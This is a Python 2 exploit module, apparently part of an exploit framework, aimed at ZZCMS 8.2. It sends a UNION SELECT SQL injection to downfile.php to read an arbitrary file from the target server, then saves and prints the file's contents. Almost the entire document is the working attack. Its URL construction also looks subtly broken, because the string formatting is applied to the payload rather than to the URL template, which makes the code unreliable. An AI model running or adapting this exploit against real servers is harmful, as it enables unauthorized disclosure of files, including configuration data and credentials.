import requests


# Exploit founded by BREACHERS
# No referer.


def info(): # Exploit information for database mechanism
    info = {
        'name': 'zzcms_82_afr',
        'description': 'ZZCMS 8.2 arbitrary file read',
        'date': '2018-12-27',
        'parameters': {
            'url': 'Target URL',
            'filename': 'File to read',
            'timeout': 'Timeout'
        },
        'referer': 'None'
    }
    return info



class exploit():
    def __init__(self):
        self.parm = {'url': None, 'filename': None, 'timeout': None}
        pass


    def exploit(self):
        timeout = self.parm['timeout']
        try:
            if requests.get('http://%s/downfile.php' %(str(self.parm['url'])), timeout=timeout).status_code == 404:
                print '[!] Download page not found.'
                return
            print '[*] Triggering exploit.'
            payload = ''
            payload += 'union%20select%200x'
            payload += str(self.parm['filename']).encode('hex')
            resp = requests.get('http://%s/downfile.php?id=123321' + payload %(self.parm['url']), timeout=timeout)
            if resp.status_code in [404, 500, 401, 502]:
                print '[!] Failed to trigger exploit.'
                return
            DownloadedFile = open(str(self.parm['filename']), 'w+')
            DownloadedFile.write(resp.text)
            DownloadedFile.close()
            print '[+] Exploit success, file saved.'
            print '[+] Incoming file content:'
            print resp.text
        except Exception,e :
            print '[!] Exploit failed: %s' %(str(e))
        return


    def info(self):
        ExpInf = info()
        print '[*] Incoming exploit information.'
        print ' |   NAME: %s' %(ExpInf['name'])
        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
        print ' |   DATE: %s' %(ExpInf['date'])
        print ' |   PARAMETERS:'
        parameters = ExpInf['parameters']
        for item in ExpInf['parameters'].keys():
            print ' |   |  %s: %s' %(item, parameters[item])
        print ' |   REFERER: %s' %(ExpInf['referer'])
        return

